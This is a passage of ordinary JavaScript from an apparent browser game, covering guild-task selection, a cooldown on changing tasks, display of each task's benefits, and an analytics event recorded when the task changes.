        guildNameElement.addEventListener('click', enableGuildNameEditing);
        document.getElementById('guild-tab').disabled = false;
        document.querySelectorAll('input[name="guild-task"]').forEach(input => {
            input.addEventListener('change', handleGuildTaskChange);
        });

        // Set initial guild task and update UI
        updateGuildBenefitsUI(currentGuildTask);

        if(currentGuildTask === "wordle") {
            document.getElementById('wordle-guild').checked = true;
            activateWordleGuild();
        }
        if(currentGuildTask === "arena") {
            document.getElementById('arena-guild').checked = true;
            activateArenaGuild();
        }        if(currentGuildTask === "publishing") {
            document.getElementById('publishing-guild').checked = true;
            activatePublishingGuild();
        }
        
        guildInit = true;
    }

    let guildChangeCooldown = modifiers.find(modifier => modifier.name === "Guild task change cooldown");
    if(guildChangeCooldown) {
        if(guildUIState != "cooldown") {
            guildUIState = "cooldown";
            document.getElementById('guild-task-change-remaining').style.display = 'block';
            document.querySelectorAll('input[name="guild-task"]').forEach(input => {
                input.disabled = true;
            });
        }
        document.getElementById('guild-task-change-remaining').textContent = `Specialization change cooldown: ${(guildChangeCooldown.duration / Tickrate).toFixed(0)}s`;
    } else {
        if(guildUIState != "init") {
            guildUIState = "init";
            document.getElementById('guild-task-change-remaining').style.display = 'none';
            document.querySelectorAll('input[name="guild-task"]').forEach(input => {
                input.disabled = false;
            });
        }
    }
}

function updateGuildBenefitsUI(taskType) {
    // Hide all benefits and show the selected one
    document.getElementById('no-benefits-message').style.display = 'none';
    document.getElementById('wordle-benefits').style.display = 'none';
    document.getElementById('arena-benefits').style.display = 'none';
    document.getElementById('publishing-benefits').style.display = 'none';
    
    if (taskType) {
        document.getElementById(`${taskType}-benefits`).style.display = 'flex';
    } else {
        document.getElementById('no-benefits-message').style.display = 'block';
    }
}

function handleGuildTaskChange(event) {
    playClickSound();
    currentGuildTask = event.target.value;
    spawnBoost(5); // Set a cooldown on changing guild tasks
    
    // Update UI benefits section
    updateGuildBenefitsUI(currentGuildTask);
    
    switch (currentGuildTask) {
        case 'wordle':
            activateWordleGuild();
            break;
        case 'arena':
            activateArenaGuild();
            break;
        case 'publishing':
            activatePublishingGuild();
            break;
    }
    gtag('event', 'guild_task_change', {
        'guild_task': currentGuildTask
    });
}

function activateWordleGuild() {
    document.getElementById('additional-wordle-hint').style.display = 'block';
    deactivateArenaGuild();
    deactivatePublishingGuild();
}

function activateArenaGuild() {
    deactivateWordleGuild();
    deactivatePublishingGuild();
}

function activatePublishingGuild() {
    deactivateWordleGuild();
    deactivateArenaGuild();
}

function deactivateWordleGuild() {
    document.getElementById('additional-wordle-hint').style.display = 'none';
}

function deactivateArenaGuild() {

}

function deactivatePublishingGuild() {
    
}
